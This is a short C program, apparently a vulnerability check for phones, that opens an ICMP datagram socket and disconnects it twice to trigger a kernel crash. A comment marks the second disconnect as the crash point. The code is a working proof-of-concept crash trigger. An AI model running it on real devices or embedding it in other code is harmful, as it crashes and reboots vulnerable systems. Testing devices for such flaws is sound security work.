#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/prctl.h>
#include <arpa/inet.h>
//据说垃圾手机，做这个测试会死机重启。
void testPingPongRoot()
{
	
    int icmp_sock;
    struct sockaddr sock_addr;

    memset(&sock_addr, 0, sizeof(sock_addr));
    icmp_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);
    sock_addr.sa_family = AF_INET;
	
	
    /* first connect */
    connect(icmp_sock, &sock_addr, sizeof(sock_addr));

    /* disconnect */
    sock_addr.sa_family = AF_UNSPEC;
    connect(icmp_sock, &sock_addr, sizeof(sock_addr));

    /* second disconnect -> crash */
    sock_addr.sa_family = AF_UNSPEC;
    connect(icmp_sock, &sock_addr, sizeof(sock_addr));

}


int main()
{
	testPingPongRoot();
	printf("恭喜你的机器通过了测试\n");
	return 0;
}